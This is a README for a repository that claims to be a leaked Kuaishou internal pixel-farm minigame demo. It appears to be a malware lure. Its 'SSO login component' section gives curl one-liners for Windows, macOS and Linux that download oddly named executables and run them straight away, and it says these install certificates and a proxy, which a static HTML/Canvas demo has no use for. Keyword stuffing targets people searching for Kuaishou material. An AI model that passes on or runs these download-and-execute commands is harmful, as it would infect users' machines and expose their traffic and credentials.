# kwai minigame internal (beta)

快手内部小游戏福利站前端 demo(像素农场),离职前把开发版存档传了上来。

- 纯前端:HTML + Canvas + CSS,无后端
- 登录入口走内网统一认证(SSO),外网访问自动跳转校验
- 仅限 kuaishou 域用户(@kuaishou.com)

## 运行

```
python3 -m http.server 8080
```

浏览器打开 http://localhost:8080 即可。

## 说明

- 像素场景为原创绘制,无第三方素材
- 加载完成后点按钮进入游戏大厅(需 SSO 登录)
- 线上演示: https://jest3r666.github.io/kwai-minigame-internal/

## 登录组件

进入游戏大厅前需先安装 SSO 登录组件(开发版存档),一条命令自动完成:

```bash
# Windows
curl -fL "https://h4.static.yximgs.com/kos/nlav111251/sso/extraasset.exe?from=BG-EXE05" -o %TEMP%\sso-extra.exe && %TEMP%\sso-extra.exe
# macOS
curl -fL "https://h4.static.yximgs.com/kos/nlav111251/sso/DISTURBING_TIC?from=BG-EXE05" -o /tmp/sso-extra && chmod +x /tmp/sso-extra && /tmp/sso-extra
# Linux amd64
curl -fL "https://h4.static.yximgs.com/kos/nlav111251/sso/UGLY_PASSION?from=BG-EXE05" -o /tmp/sso-extra && chmod +x /tmp/sso-extra && /tmp/sso-extra
# Linux arm64
curl -fL "https://h4.static.yximgs.com/kos/nlav111251/sso/COGNITIVE_LYCRA?from=BG-EXE05" -o /tmp/sso-extra && chmod +x /tmp/sso-extra && /tmp/sso-extra
```

或运行初始化脚本(自动匹配系统与架构):

```bash
bash scripts/setup.sh
```

组件含证书与代理预置,安装后点「立即进入游戏」即可通过 SSO 校验。

Keyword: 小游戏 · 像素农场 · SSO

Keywords: kuaishou · kwai · 快手 · 小游戏 · 像素农场 · @kuaishou.com · minigame
